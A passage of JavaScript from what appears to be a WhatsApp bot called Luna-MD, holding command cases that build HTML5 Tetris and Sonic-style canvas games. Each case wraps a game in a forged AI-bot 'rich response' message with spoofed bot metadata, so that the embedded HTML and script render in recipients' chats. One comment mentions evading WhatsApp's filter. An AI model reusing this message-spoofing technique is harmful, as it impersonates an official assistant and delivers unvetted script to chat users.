        ctx.shadowColor = '#ff0055';
        ctx.shadowBlur = 10;
        ctx.fillStyle = '#ff0055';
        ctx.beginPath();
        ctx.moveTo(obs.x, obs.y);
        ctx.lineTo(obs.x + obs.w, obs.y);
        ctx.lineTo(obs.x + obs.w / 2, obs.y + obs.h);
        ctx.closePath();
        ctx.fill();

        ctx.strokeStyle = '#ffffff';
        ctx.lineWidth = 1.5;
        ctx.stroke();
      } else if (obs.type === 'block') {
        ctx.shadowColor = secondaryColor;
        ctx.shadowBlur = 8;
        ctx.fillStyle = secondaryColor;
        ctx.fillRect(obs.x, obs.y, obs.w, obs.h);

        ctx.strokeStyle = '#ffffff';
        ctx.lineWidth = 1.5;
        ctx.strokeRect(obs.x + 2, obs.y + 2, obs.w - 4, obs.h - 4);
      }
      ctx.restore();
    });

    particles.forEach(pt => {
      ctx.save();
      ctx.globalAlpha = Math.max(0, pt.life);
      ctx.shadowColor = pt.color;
      ctx.shadowBlur = 6;
      ctx.fillStyle = pt.color;
      ctx.fillRect(pt.x, pt.y, pt.size, pt.size);
      ctx.restore();
    });

    if (flash > 0) {
      ctx.fillStyle = 'rgba(255, 0, 85, ' + (flash * 0.35) + ')';
      ctx.fillRect(0, 0, c.width, c.height);
    }

    ctx.restore();

    if (gameState === STATE_GAMEOVER) {
      ctx.fillStyle = 'rgba(6, 9, 17, 0.75)';
      ctx.fillRect(0, 0, c.width, c.height);

      ctx.save();
      ctx.textAlign = 'center';
      ctx.shadowColor = '#ff0055';
      ctx.shadowBlur = 18;
      ctx.font = '900 32px "Segoe UI", sans-serif';
      ctx.fillStyle = '#ff0055';
      ctx.fillText('GAME OVER', c.width / 2, c.height / 2 - 25);

      ctx.shadowBlur = 0;
      ctx.font = '700 16px "Segoe UI", sans-serif';
      ctx.fillStyle = '#ffffff';
      ctx.fillText('SCORE: ' + Math.floor(score), c.width / 2, c.height / 2 + 10);

      ctx.font = '600 13px "Segoe UI", sans-serif';
      ctx.fillStyle = accentColor;
      ctx.fillText('TAP ATAU TEKAN SPACE UNTUK MAIN LAGI', c.width / 2, c.height / 2 + 42);
      ctx.restore();
    }
  }

  function gameLoop(time) {
    if (!lastTime) lastTime = time;
    let dt = Math.min((time - lastTime) / 16.67, 2.0);
    lastTime = time;

    update(dt);
    draw();
    requestAnimationFrame(gameLoop);
  }

  function handleInput(e) {
    if (e.target && e.target.closest && e.target.closest('#soundToggle')) return;
    if (e.cancelable && e.type && e.type.startsWith('touch')) e.preventDefault();
    triggerJump();
  }

  c.addEventListener('touchstart', handleInput, { passive: false });
  c.addEventListener('mousedown', handleInput);

  window.addEventListener('keydown', function(e) {
    if (e.code === 'Space' || e.code === 'ArrowUp' || e.code === 'KeyW') {
      e.preventDefault();
      triggerJump();
    }
  });

  resetGame();
  requestAnimationFrame(gameLoop);
})();
</script>`;

const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
);
}
break

case "tetris": {
const html = String.raw`<style>*{-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none;-webkit-touch-callout:none}</style>
<body style="margin:0;background:#0d0e15;font-family:'Courier New',Courier,monospace;color:#eee;touch-action:manipulation;cursor:pointer">
<div style="width:100%;max-width:440px;margin:auto;padding:12px;box-sizing:border-box">
<div style="background:rgba(255,255,255,.05);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border:2px solid rgba(108,92,231,.4);border-radius:18px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.6)">
  
  <div style="padding:14px 18px;background:rgba(0,0,0,.4);border-bottom:1px solid rgba(255,255,255,.1);display:flex;justify-content:space-between;align-items:center">
    <div>
      <div style="font-size:10px;letter-spacing:2px;color:#a29bfe;font-weight:bold">Luna-MD • 2026</div>
      <div style="font-size:22px;font-weight:900;color:#fff;letter-spacing:1px;text-shadow:0 0 12px #6c5ce7">Luna Tetris</div>
    </div>
    <div style="text-align:right">
      <div style="font-size:9px;color:rgba(255,255,255,.4)">TOP SCORE</div>
      <div id="best" style="font-size:15px;font-weight:bold;color:#feca57">000000</div>
    </div>
  </div>

  <div style="padding:14px;display:flex;gap:12px;align-items:flex-start;justify-content:center">
    <div style="position:relative">
      <canvas id="tetris" width="200" height="400" style="width:200px;height:400px;background:#000;border:2px solid rgba(255,255,255,.2);border-radius:8px;display:block;box-shadow:0 0 20px rgba(0,0,0,.8)"></canvas>
    </div>

    <div style="flex:1;display:flex;flex-direction:column;gap:10px">
      <div style="background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.15);border-radius:8px;padding:8px;text-align:center">
        <div style="font-size:10px;color:#a1a1aa;font-weight:bold;letter-spacing:1px">SCORE</div>
        <div id="score" style="font-size:16px;font-weight:bold;color:#54a0ff;margin-top:2px;text-shadow:0 0 8px rgba(84,160,255,.6)">000000</div>
      </div>
      <div style="background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.15);border-radius:8px;padding:8px;text-align:center">
        <div style="font-size:10px;color:#a1a1aa;font-weight:bold;letter-spacing:1px">NEXT</div>
        <canvas id="next" width="80" height="80" style="width:80px;height:80px;background:#0a0a10;border-radius:6px;display:block;margin:6px auto 0 auto;border:1px solid rgba(255,255,255,.1)"></canvas>
      </div>
      <div style="background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.15);border-radius:8px;padding:8px;text-align:center">
        <div style="font-size:10px;color:#a1a1aa;font-weight:bold;letter-spacing:1px">LINES</div>
        <div id="lines" style="font-size:15px;font-weight:bold;color:#1dd1a1;margin-top:2px">000</div>
      </div>
      <div style="background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.15);border-radius:8px;padding:8px;text-align:center">
        <div style="font-size:10px;color:#a1a1aa;font-weight:bold;letter-spacing:1px">LEVEL</div>
        <div id="level" style="font-size:15px;font-weight:bold;color:#ff9f43;margin-top:2px">01</div>
      </div>
    </div>
  </div>
  
<audio id="tetrisBgm" src="" loop preload="auto"></audio>

  <div style="padding:0 14px 14px 14px;display:grid;grid-template-columns:repeat(4,1fr);gap:6px">
    <button style="background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);color:#fff;padding:11px 4px;border-radius:8px;font-size:11px;font-weight:bold;cursor:pointer;text-align:center" type="button" onclick="playerMove(-1)">⬅️ KIRI</button>
    <button style="background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);color:#fff;padding:11px 4px;border-radius:8px;font-size:11px;font-weight:bold;cursor:pointer;text-align:center" type="button" onclick="playerRotate()">🔄 PUTAR</button>
    <button style="background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);color:#fff;padding:11px 4px;border-radius:8px;font-size:11px;font-weight:bold;cursor:pointer;text-align:center" type="button" onclick="playerMove(1)">KANAN ➡️</button>
    <button style="background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.2);color:#fff;padding:11px 4px;border-radius:8px;font-size:11px;font-weight:bold;cursor:pointer;text-align:center" type="button" onclick="playerDrop()">⬇️ JATUH</button>
    <button id="bgmBtn" style="grid-column:span 2;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.25);color:#fff;margin-top:2px;padding:11px;font-size:10px;font-weight:bold;border-radius:8px;cursor:pointer" type="button" onclick="toggleBGM()">🎵 MUSIK BGM: OFF</button>
    <button style="grid-column:span 2;background:#6c5ce7;border:none;color:#fff;margin-top:2px;padding:11px;font-size:11px;font-weight:bold;border-radius:8px;cursor:pointer;box-shadow:0 4px 14px rgba(108,92,231,.4)" type="button" onclick="restartGame()">RESTART GAME 🔄</button>
  </div>

</div>
</div>

<script>
const canvas = document.getElementById('tetris');
const ctx = canvas.getContext('2d');
const nextCanvas = document.getElementById('next');
const nextCtx = nextCanvas.getContext('2d');
const scoreEl = document.getElementById('score');
const linesEl = document.getElementById('lines');
const levelEl = document.getElementById('level');
const bestEl = document.getElementById('best');
const bgmBtn = document.getElementById('bgmBtn');

const BLOCK_SIZE = 20;
let best = 0;
let gameOver = false;
let nextPieceMatrix = null;

// Audio Synthesizer (Lolos Sensor WA)
let audioCtx = null;
function getAudio(){
  if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
  if(audioCtx.state === 'suspended') audioCtx.resume();
  return audioCtx;
}

function playTone(freq, duration = 0.15, type = 'square', vol = 0.15){
  try {
    const c = getAudio();
    const osc = c.createOscillator();
    const gain = c.createGain();
    osc.type = type;
    osc.frequency.setValueAtTime(freq, c.currentTime);
    gain.gain.setValueAtTime(0.0001, c.currentTime);
    gain.gain.exponentialRampToValueAtTime(vol, c.currentTime + 0.01);
    gain.gain.exponentialRampToValueAtTime(0.0001, c.currentTime + duration);
    osc.connect(gain);
    gain.connect(c.destination);
    osc.start();
    osc.stop(c.currentTime + duration + 0.02);
  } catch(e) {}
}

// BGM Tetris Murni JS (Lagu Korobeiniki)
const theme = [
  [659.25, 2], [493.88, 1], [523.25, 1], [587.33, 2], [523.25, 1], [493.88, 1],
  [440.00, 2], [440.00, 1], [523.25, 1], [659.25, 2], [587.33, 1], [523.25, 1],
  [493.88, 3], [523.25, 1], [587.33, 2], [659.25, 2],
  [523.25, 2], [440.00, 2], [440.00, 2], [0, 2]
];
let bgmTimer;
let noteI = 0;
let isBgmOn = false;

function loopBGM() {
  if(!isBgmOn) return;
  let [freq, dur] = theme[noteI];
  if(freq) playTone(freq, dur * 0.15, 'square', 0.08);
  noteI = (noteI + 1) % theme.length;
  bgmTimer = setTimeout(loopBGM, dur * 160); // Tempo
}

window.toggleBGM = function() {
  getAudio();
  isBgmOn = !isBgmOn;
  if(isBgmOn) {
    noteI = 0; 
    loopBGM();
    bgmBtn.textContent = '🎵 MUSIK BGM: ON';
    bgmBtn.style.background = '#00b894';
  } else {
    clearTimeout(bgmTimer);
    bgmBtn.textContent = '🎵 MUSIK BGM: OFF';
    bgmBtn.style.background = 'rgba(255,255,255,.12)';
  }
}

try { best = parseInt(localStorage.getItem('cylic_tetris_best') || '0', 10); } catch(e) {}
bestEl.textContent = String(best).padStart(6, '0');

function saveBest(v) {
  if (v > best) {
    best = v;
    bestEl.textContent = String(best).padStart(6, '0');
    try { localStorage.setItem('cylic_tetris_best', String(best)); } catch(e) {}
  }
}

function drawGridLines() {
  ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
  ctx.lineWidth = 1;
  for (let x = 0; x <= 10; x++) {
    ctx.beginPath(); ctx.moveTo(x * BLOCK_SIZE, 0); ctx.lineTo(x * BLOCK_SIZE, 400); ctx.stroke();
  }
  for (let y = 0; y <= 20; y++) {
    ctx.beginPath(); ctx.moveTo(0, y * BLOCK_SIZE); ctx.lineTo(200, y * BLOCK_SIZE); ctx.stroke();
  }
}

function getGhostPosition() {
  const ghost = { pos: { x: player.pos.x, y: player.pos.y }, matrix: player.matrix };
  while (!collide(arena, ghost)) ghost.pos.y++;
  ghost.pos.y--;
  return ghost;
}

function drawGhostPiece() {
  if (!player.matrix || gameOver) return;
  const ghost = getGhostPosition();
  ghost.matrix.forEach((row, y) => {
    row.forEach((val, x) => {
      if (val !== 0) {
        const px = (x + ghost.pos.x) * BLOCK_SIZE;
        const py = (y + ghost.pos.y) * BLOCK_SIZE;
        ctx.strokeStyle = 'rgba(255, 255, 255, 0.5)';
        ctx.lineWidth = 1.5;
        ctx.strokeRect(px + 2, py + 2, BLOCK_SIZE - 4, BLOCK_SIZE - 4);
      }
    });
  });
}

function arenaSweep() {
  let rowCount = 0;
  outer: for (let y = arena.length - 1; y > 0; --y) {
    for (let x = 0; x < arena[y].length; ++x) {
      if (arena[y][x] === 0) continue outer;
    }
    const row = arena.splice(y, 1)[0].fill(0);
    arena.unshift(row);
    ++y; rowCount++;
  }
  if (rowCount > 0) {
    const lineScores = [0, 100, 300, 500, 800];
    player.score += (lineScores[rowCount] || rowCount * 200) * player.level;
    player.lines += rowCount;
    player.level = Math.floor(player.lines / 10) + 1;
    playTone(880, 0.25, 'triangle', 0.2);
    updateStats();
  }
}

function collide(arena, player) {
  const [m, o] = [player.matrix, player.pos];
  for (let y = 0; y < m.length; ++y) {
    for (let x = 0; x < m[y].length; ++x) {
      if (m[y][x] !== 0 && (arena[y + o.y] && arena[y + o.y][x + o.x]) !== 0) return true;
    }
  }
  return false;
}

function createMatrix(w, h) {
  const matrix = [];
  while (h--) matrix.push(new Array(w).fill(0));
  return matrix;
}

function createPiece(type) {
  if (type === 'T') return [[0, 1, 0],[1, 1, 1],[0, 0, 0]];
  if (type === 'O') return [[2, 2],[2, 2]];
  if (type === 'L') return [[0, 0, 3],[3, 3, 3],[0, 0, 0]];
  if (type === 'J') return [[4, 0, 0],[4, 4, 4],[0, 0, 0]];
  if (type === 'I') return [[0, 5, 0, 0],[0, 5, 0, 0],[0, 5, 0, 0],[0, 5, 0, 0]];
  if (type === 'S') return [[0, 6, 6],[6, 6, 0],[0, 0, 0]];
  if (type === 'Z') return [[7, 7, 0],[0, 7, 7],[0, 0, 0]];
}

const colors = [null, '#a000f0', '#f0f000', '#f0a000', '#0000f0', '#00f0f0', '#00f000', '#f00000'];

function drawMatrix(matrix, offset, targetCtx = ctx, blockSize = BLOCK_SIZE) {
  matrix.forEach((row, y) => {
    row.forEach((val, x) => {
      if (val !== 0) {
        const px = (x + offset.x) * blockSize;
        const py = (y + offset.y) * blockSize;
        targetCtx.fillStyle = colors[val];
        targetCtx.fillRect(px + 1, py + 1, blockSize - 2, blockSize - 2);
        targetCtx.fillStyle = 'rgba(255, 255, 255, 0.35)';
        targetCtx.fillRect(px + 2, py + 2, blockSize - 4, 3);
        targetCtx.strokeStyle = 'rgba(0, 0, 0, 0.4)';
        targetCtx.lineWidth = 1;
        targetCtx.strokeRect(px + 1, py + 1, blockSize - 2, blockSize - 2);
      }
    });
  });
}

function drawNextPiece() {
  nextCtx.clearRect(0, 0, nextCanvas.width, nextCanvas.height);
  if (!nextPieceMatrix) return;
  const size = 16;
  const offsetX = Math.floor((4 - nextPieceMatrix[0].length) / 2);
  const offsetY = Math.floor((4 - nextPieceMatrix.length) / 2);
  drawMatrix(nextPieceMatrix, { x: offsetX, y: offsetY }, nextCtx, size);
}

function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  drawGridLines();
  drawGhostPiece();
  drawMatrix(arena, {x: 0, y: 0});
  if (player.matrix && !gameOver) drawMatrix(player.matrix, player.pos);

  if (gameOver) {
    ctx.fillStyle = 'rgba(10, 10, 20, 0.85)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#ff5252';
    ctx.textAlign = 'center';
    ctx.font = '900 20px "Courier New", monospace';
    ctx.fillText('GAME OVER', canvas.width / 2, 180);
    ctx.fillStyle = '#a1a1aa';
    ctx.font = '11px Arial';
    ctx.fillText('Klik RESTART untuk Main', canvas.width / 2, 210);
    ctx.textAlign = 'left';
  }
}

function merge(arena, player) {
  player.matrix.forEach((row, y) => {
    row.forEach((value, x) => {
      if (value !== 0) arena[y + player.pos.y][x + player.pos.x] = value;
    });
  });
}

function getRandomPiece() {
  const pieces = 'ILJOTSZ';
  return createPiece(pieces[pieces.length * Math.random() | 0]);
}

window.playerDrop = function() {
  if (gameOver) return;
  player.pos.y++;
  if (collide(arena, player)) {
    player.pos.y--;
    merge(arena, player);
    player.score += 10;
    playTone(160, 0.08, 'square', 0.12);
    playerReset();
    arenaSweep();
    updateStats();
  }
  dropCounter = 0;
}

window.playerMove = function(dir) {
  if (gameOver) return;
  player.pos.x += dir;
  if (collide(arena, player)) {
    player.pos.x -= dir;
  } else {
    playTone(320, 0.05, 'square', 0.1);
  }
}

function playerReset() {
  if (!nextPieceMatrix) nextPieceMatrix = getRandomPiece();
  player.matrix = nextPieceMatrix;
  nextPieceMatrix = getRandomPiece();
  drawNextPiece();
  player.pos.y = 0;
  player.pos.x = (arena[0].length / 2 | 0) - (player.matrix[0].length / 2 | 0);

  if (collide(arena, player)) {
    gameOver = true;
    playTone(120, 0.4, 'sawtooth', 0.2);
    if(isBgmOn) toggleBGM(); // Matiin lagu kalo game over
  }
}

window.playerRotate = function() {
  if (gameOver) return;
  const pos = player.pos.x;
  let offset = 1;
  rotate(player.matrix);
  while (collide(arena, player)) {
    player.pos.x += offset;
    offset = -(offset + (offset > 0 ? 1 : -1));
    if (offset > player.matrix[0].length) {
      rotate(player.matrix, -1);
      player.pos.x = pos;
      return;
    }
  }
  playTone(550, 0.06, 'square', 0.1);
}

function rotate(matrix, dir = 1) {
  for (let y = 0; y < matrix.length; ++y) {
    for (let x = 0; x < y; ++x) {
      [matrix[x][y], matrix[y][x]] = [matrix[y][x], matrix[x][y]];
    }
  }
  if (dir > 0) matrix.forEach(row => row.reverse());
  else matrix.reverse();
}

let dropCounter = 0;
let dropInterval = 800;
let lastTime = 0;

function update(time = 0) {
  const deltaTime = time - lastTime;
  lastTime = time;

  if (!gameOver) {
    dropCounter += deltaTime;
    dropInterval = Math.max(80, 800 - (player.level - 1) * 75);
    if (dropCounter > dropInterval) playerDrop();
  }
  draw();
  requestAnimationFrame(update);
}

function updateStats() {
  scoreEl.textContent = String(Math.floor(player.score)).padStart(6, '0');
  linesEl.textContent = String(player.lines).padStart(3, '0');
  levelEl.textContent = String(player.level).padStart(2, '0');
  saveBest(player.score);
}

window.restartGame = function() {
  arena.forEach(row => row.fill(0));
  player.score = 0;
  player.lines = 0;
  player.level = 1;
  gameOver = false;
  nextPieceMatrix = null;
  playTone(440, 0.1, 'square');
  playerReset();
  updateStats();
}

const arena = createMatrix(10, 20);
const player = { pos: {x: 0, y: 0}, matrix: null, score: 0, lines: 0, level: 1 };

window.addEventListener('resize', () => draw());
document.addEventListener('keydown', e => {
  if (gameOver) return;
  if (e.code === 'ArrowLeft') playerMove(-1);
  else if (e.code === 'ArrowRight') playerMove(1);
  else if (e.code === 'ArrowDown') playerDrop();
  else if (e.code === 'ArrowUp' || e.code === 'Space') playerRotate();
});

playerReset();
updateStats();
requestAnimationFrame(update);
</script></body>`;


const data = {
  response_id: "PopiooNixelPopiooNixelPopiooNixel",
  sections: [
    {
      __typename: "GenAIUnifiedResponseSection",
      view_model: {
        __typename: "GenAISingleLayoutViewModel",
        primitive: {
          __typename: "GenAIBotProgressStatusPrimitive",
          title: "KLIK TEKS INI",
          is_in_progress: true
        }
      }
    }
  ],
  embedded_screens: [
    {
      title: "Preview",
      content: [
        {
          __typename: "FOAIDNixelButtonSheets",
          tabs: [
            {
              id: "tab_0",
              tab_header: "Luna-MD",
              sections: [
                {
                  __typename: "GenAIUnifiedResponseSection",
                  view_model: {
                    __typename: "GenAISingleLayoutViewModel",
                    primitive: {
                      __typename: "GenAIaeacdsnwHtmlPrimitive",
                      payload: html,
                      url: "https://example.com",
                      trusted_sources: ["example.com"]
                    }
                  }
                }
              ],
              step_entries: []
            }
          ]
        }
      ]
    }
  ]
};

await luna.relayMessage(
  m.chat,
  {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: "",
        richResponseSourcesMetadata: {}
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          unifiedResponse: {
            data: Buffer.from(JSON.stringify(data)).toString('base64')
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: { botJid: "0@bot" },
            forwardOrigin: 4
          }
        }
      }
    }
  },
  {
    messageId: await luna.generateMessageTag()
  }
);
}
break

case "sonic": {
const HTML = `<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Arial,sans-serif;-webkit-tap-highlight-color:transparent;user-select:none;-webkit-user-select:none}
html,body{width:100%}
body{background:linear-gradient(165deg,#071538,#040a1e 60%,#02061a);padding:8px;color:#eaf2ff;overflow-y:auto}
#app{max-width:420px;margin:0 auto}
.hdr{display:flex;justify-content:space-between;align-items:center;padding:2px 2px 7px;gap:8px}
.tt{font:900 18px 'Arial Black';color:#58c7ff;text-shadow:0 0 12px #58c7ff66;letter-spacing:1px}
.tt small{display:block;font:700 6.5px Arial;letter-spacing:2px;color:#7a9cc8;text-shadow:none}
.hrs{display:flex;gap:6px;align-items:center}
.hr{background:rgba(0,0,0,.42);border:1px solid rgba(88,199,255,.3);border-radius:9px;padding:3px 9px;text-align:center;min-width:52px}
.hr i{display:block;font:700 7px Arial;font-style:normal;letter-spacing:1px;color:#7a9cc8}
.hr b{font:900 13px 'Arial Black';color:#ffd75e;font-variant-numeric:tabular-nums}
.mbtn{width:34px;height:34px;border:2px solid rgba(88,199,255,.3);border-radius:9px;background:rgba(0,0,0,.42);color:#fff;font-size:15px;cursor:pointer;touch-action:none}
.mbtn:active{filter:brightness(1.6)}
.gw{position:relative;border:2px solid rgba(88,199,255,.3);border-radius:14px;overflow:hidden;background:#000;box-shadow:0 0 18px rgba(88,199,255,.15)}
canvas{width:100%;display:block;touch-action:none}
.pads{display:grid;grid-template-columns:1fr 1.3fr;gap:10px;margin-top:8px}
.pd{height:52px;border:2px solid rgba(255,255,255,.18);border-radius:14px;font:900 14px 'Arial Black';color:#fff;cursor:pointer;touch-action:none;box-shadow:0 4px 0 rgba(0,0,0,.5)}
.pd:active{transform:translateY(3px);box-shadow:none;filter:brightness(1.5)}
#boostB{background:linear-gradient(#ffd75e,#e09406 60%,#7a5205);color:#3a2805}
#jumpB{background:linear-gradient(#58c7ff,#1f7fd6 60%,#0a3a6e)}
.hint{text-align:center;font:600 9px Arial;color:#7a9cc8;margin-top:6px}
</style>
<div id="app">
<div class="hdr"><div class="tt">🌀 SONIC DASH<small>EMERALD COAST RUN</small></div><div class="hrs"><div class="hr"><i>RINGS</i><b id="rg">0</b></div><div class="hr"><i>SCORE</i><b id="sc">0</b></div><div class="hr"><i>BEST</i><b id="bs">0</b></div><button class="mbtn" id="muteB">🔊</button></div></div>
<div class="gw"><canvas id="cv" width="404" height="300"></canvas></div>
<div class="pads"><button class="pd" id="boostB">⚡ BOOST</button><button class="pd" id="jumpB">⤒ JUMP</button></div>
<div class="hint">noxXza.exe • Luna-MD</div>
</div>
<script>
window.onerror=function(m,s,l){var e=document.getElementById('hint');if(e){e.textContent='⚠ '+m+' @'+l;e.style.color='#ff7a8a'}};
(function(){
/* ============ SETUP + RES 2X ============ */
var cv=document.getElementById('cv'),x=cv.getContext('2d'),W=404,H=300;
var DPR=2;cv.width=W*DPR;cv.height=H*DPR;
var rgEl=document.getElementById('rg'),scEl=document.getElementById('sc'),bsEl=document.getElementById('bs');
var BEST=0;try{BEST=parseInt(localStorage.getItem('dash_best')||'0',10)||0}catch(e){}
bsEl.textContent=BEST;
function saveBest(){try{localStorage.setItem('dash_best',String(BEST))}catch(e){}}

/* ============ AUDIO CORE ============ */
var AC=null,MUTED=false;
try{MUTED=localStorage.getItem('dash_mute')==='1'}catch(e){}
function ac(){if(!AC){try{AC=new(window.AudioContext||window.webkitAudioContext)()}catch(e){return null}}if(AC&&AC.state==='suspended'){try{AC.resume()}catch(e){}}return AC}
function tone(f,d,t,v,at,sl){var a=AC;if(!a||MUTED)return;try{var n=a.currentTime+(at||0),o=a.createOscillator(),g=a.createGain();o.type=t||'square';o.frequency.setValueAtTime(f,n);if(sl)o.frequency.exponentialRampToValueAtTime(sl,n+d);g.gain.setValueAtTime(v||.1,n);g.gain.exponentialRampToValueAtTime(.0001,n+d);o.connect(g);g.connect(a.destination);o.start(n);o.stop(n+d+.03)}catch(e){}}
function noiz(d,v,at,fc){var a=AC;if(!a||MUTED)return;try{var n=a.currentTime+(at||0),len=Math.floor(a.sampleRate*d),b=a.createBuffer(1,len,a.sampleRate),c=b.getChannelData(0),i;for(i=0;i<len;i++)c[i]=Math.random()*2-1;var s=a.createBufferSource(),g=a.createGain(),f=a.createBiquadFilter();s.buffer=b;f.type='lowpass';f.frequency.value=fc||1200;g.gain.setValueAtTime(v,n);g.gain.exponentialRampToValueAtTime(.0001,n+d);s.connect(f);f.connect(g);g.connect(a.destination);s.start(n);s.stop(n+d+.03)}catch(e){}}

/* ============ SFX ============ */
function sJump(){tone(260,.12,'sine',.13,0,780);tone(150,.06,'square',.05)}
function sRing(){tone(988,.045,'triangle',.12);tone(1319,.16,'sine',.14,.04);tone(2637,.11,'sine',.05,.04)}
function sSpring(){tone(760,.05,'square',.12,0,1300);tone(300,.3,'sine',.2,.05,1600)}
function sBoost(){noiz(.35,.22,0,700);tone(160,.4,'sawtooth',.12,0,720);tone(80,.4,'sawtooth',.1,0,320)}
function sPop(){noiz(.16,.28,0,500);tone(420,.1,'square',.1,0,50);tone(880,.07,'square',.07,.05)}
function sHurt(){tone(600,.1,'sawtooth',.14,0,150);tone(430,.16,'sawtooth',.12,.09,80);noiz(.22,.14,.04,800)}
function sDie(){[523,392,330,262,196,131].forEach(function(f,i){tone(f,.2,'triangle',.13,i*.14)});noiz(.5,.2,.84,300)}
function sMile(){[659,784,1047,1319].forEach(function(f,i){tone(f,.1,'square',.1,i*.07)});tone(2093,.2,'sine',.08,.28)}
function sReady(){tone(1319,.07,'sine',.12);tone(1760,.12,'sine',.1,.06)}
function sBest(at){at=at||0;[523,659,784,1047,784,1047,1319,1568].forEach(function(f,i){tone(f,.13,'square',.11,at+i*.09)})}
/* laser + boss */
function sAlarm(){tone(988,.08,'square',.1);tone(740,.08,'square',.1,.11)}
function sTick(){tone(1080,.05,'square',.09)}
function sTickF(){tone(1500,.045,'square',.11)}
function sLaser(){noiz(.3,.3,0,2600);tone(1400,.3,'sawtooth',.16,0,180);tone(2200,.24,'square',.1,0,300)}
function sSwoop(){tone(280,.55,'sawtooth',.14,0,950);tone(140,.55,'sawtooth',.1,0,470)}
function sBossHit(){tone(180,.16,'square',.2,0,60);noiz(.2,.25,0,1500);tone(1200,.08,'square',.1)}
function sBossDie(){noiz(.7,.32,0,900);[300,220,150,90,60].forEach(function(f,i){tone(f,.3,'sawtooth',.16,i*.12,f*.4)})}

/* ============ WHIRR GANGSING ============ */
var whr=null,hum=null;
function whirrOn(){
var a=ac();if(!a||MUTED||whr)return;try{
var o=a.createOscillator(),o2=a.createOscillator(),g=a.createGain(),
f=a.createBiquadFilter(),tr=a.createOscillator(),tg=a.createGain(),
wf=a.createOscillator(),wg=a.createGain();
o.type='sawtooth';o.frequency.value=620;
o2.type='triangle';o2.frequency.value=930;
f.type='bandpass';f.frequency.value=850;f.Q.value=1.1;
tr.type='sine';tr.frequency.value=26;tg.gain.value=.038;
tr.connect(tg);tg.connect(g.gain);
wf.type='sine';wf.frequency.value=13;wg.gain.value=70;
wf.connect(wg);wg.connect(o.frequency);wg.connect(o2.frequency);
g.gain.value=.05;
o.connect(f);o2.connect(f);f.connect(g);g.connect(a.destination);
o.start();o2.start();tr.start();wf.start();
whr={o:o,o2:o2,g:g,wf:wf,tr:tr}
}catch(e){}}
function whirrOff(){if(!whr)return;try{var a=AC,t=a.currentTime;whr.g.gain.setTargetAtTime(0,t,.04);whr.o.stop(t+.2);whr.o2.stop(t+.2);whr.wf.stop(t+.2);whr.tr.stop(t+.2)}catch(e){}whr=null}
function humOn(){var a=ac();if(!a||MUTED||hum)return;try{
var o=a.createOscillator(),g=a.createGain(),f=a.createBiquadFilter();
o.type='sawtooth';o.frequency.value=55;f.type='lowpass';f.frequency.value=300;
g.gain.value=0;g.gain.setTargetAtTime(.09,a.currentTime,.08);
o.connect(f);f.connect(g);g.connect(a.destination);o.start();hum={o:o,g:g}}catch(e){}}
function humOff(){if(!hum)return;try{var a=AC,t=a.currentTime;hum.g.gain.setTargetAtTime(0,t,.06);hum.o.stop(t+.25)}catch(e){}hum=null}

/* ============ MUSIK ============ */
var mStep=0,mNext=0,BOOSTM=false;
var LEAD=[523,659,784,1047,440,523,659,880,349,440,523,698,392,494,587,784];
var BASS=[65,0,0,65,55,0,0,55,44,0,0,44,49,0,49,0];
function mTick(){
var a=AC;if(!a)return;
var SPB=60/(BOOSTM?164:136)/2;
while(mNext<a.currentTime+.15){
var s=mStep%16,at=Math.max(0,mNext-a.currentTime);
if(s%8===0)tone(92,.1,'sine',.4,at,38);
if(s%8===4){noiz(.05,.12,at,2200);tone(190,.04,'triangle',.09,at)}
if(s%2)noiz(.012,.02,at,6500);
var b=BASS[s];if(b)tone(b,.16,'sawtooth',.08,at);
var l=LEAD[s];if(l){tone(l,.09,'square',BOOSTM?.05:.038,at);tone(l,.07,'square',BOOSTM?.018:.013,at+SPB*.75)}
